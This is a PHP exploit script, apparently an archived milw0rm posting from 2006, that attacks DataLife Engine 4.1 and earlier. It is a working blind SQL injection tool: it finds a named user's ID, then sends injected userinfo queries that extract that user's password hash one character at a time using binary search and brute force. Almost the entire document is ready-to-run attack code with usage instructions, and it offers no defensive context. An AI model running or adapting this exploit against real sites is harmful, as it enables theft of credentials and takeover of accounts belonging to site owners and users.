<html><head><title>DataLife Engine <= 4.1 Remote SQL Injection Exploit (php)</title></head><pre>&lt;?php
error_reporting (E_ERROR);
ini_set(&quot;max_execution_time&quot;,0);

echo '
+========================================+
| RST/GHC Datalife SQL injection exploit |
+========================================+
&lt;    &gt;  Lite Version for DLE &lt;=4.1  &lt;    &gt;
';

if ($argc &lt; 2 ){
print &quot; Usage: &quot; . $argv[0] . &quot; &lt;host&gt; &lt;user&gt; [table prefix]\n&quot;;
print &quot; ex.: &quot; . $argv[0] . &quot; datalife.engine.net admin\n&quot;;
credits();
exit;
}

//DEFINE USER ID
$urla = 'http://' . $argv[1] . '/index.php?subaction=userinfo&amp;user=' . $argv[2];
$result = file_get_contents($urla);
$str1 = 'user='; #index.php?do=pm&amp;doaction=newpm&amp;user=
$position = strpos($result, $str1);

if ($position === false){ print &quot;\n\rSorry, no match found for user &quot; . $argv[2]; credits();}
$str2 = '&quot;&gt;';
$pos = strpos($result, $str2, $position);
$pos1 = $position+5;
$user_id = intval(substr($result, $pos1, $pos-$pos1));

print &quot;Trying to get hash for password of user &quot;. $argv[2] .&quot; with id=&quot; . $user_id . &quot;:\n&quot;;

//SOME defines (aka CONFIG =))
if (empty($argv[3])){ $prefix = 'dle_';} #define prefix of the tables. try to find it yourself =) it is easy =)
else {$prefix = $argv[3];}
$min = 48;  # 0
$max = 122; # z
if (check(&quot;&gt;$min&quot;, 1) == 0 &amp;&amp; check(&quot;&lt;$max&quot;, 1) == 0) {print &quot;\n Site is unvulnerable...&quot;; credits();}
for ($sn=1; $sn &lt;= 32; $sn++) {
   blind($sn, $min, $max);
}
credits();


// REQUEST function
function check($crcheck, $sn)
{
   global $argv, $user_id, $prefix;
$host   = 'http://' . $argv[1] . '/index.php'; # argv[1] - host
$name = $argv[2]; #user name
$query  = '?subaction=userinfo&amp;user=' . $name .'%2527%20and%20ascii(substring((SELECT%20password%20FROM%20' . $prefix. 'users%20WHERE%20user_id='. $user_id .'),' . $sn . ',1))' .$crcheck . '/*'; #

$http = $host . $query;
#DEBUG
#print $http . &quot;\n&quot;;
 $result = file_get_contents($http);
 
 // checking the answer
 $string = ': '.$name.'&lt;/h2&gt;'; #CORRECT it FOR your version, kids =)
#good idea is: 'do=pm&amp;doaction=newpm&amp;user='.$user_id;
 
   if (eregi($string, $result)) { return 1; }

 return 0;
}

//range function
function blind($sn, $fmin, $fmax)
{
 if (($fmax-$fmin)&lt;5) { if (crack($fmin, $fmax, $sn) == 0){print &quot;\n\rEXPLOIT FAILED...&quot;; credits();} return;}
 $compare = intval($fmin + ($fmax-$fmin)/2);
 $crcheck = &quot;&gt;&quot;. $compare;
 if ( check($crcheck, $sn) == 1 ) {
    blind($sn, $compare, $fmax);
    }
 else {
    blind($sn, $fmin, $compare+1); }
}

//brute function
function crack($cmin, $cmax, $sn)
{
 for ($i=$cmin; $i &lt;=$cmax; $i++){
   $crcheck = &quot;=$i&quot;;
   if (check($crcheck, $sn) == 1){print chr($i); return 1;}
 }
return 0;
}


function credits(){
print &quot;\n\n+========================================+\n\r Credits: 1dt.w0lf &amp; foster \n\r Copyright (c) RST/GHC&quot;;
print &quot;\n\r http://rst.void.ru &amp;&amp; http://ghc.ru\n\r+========================================+\n&quot;;
exit;
}

?&gt;

# milw0rm.com [2006-06-21]</pre></html>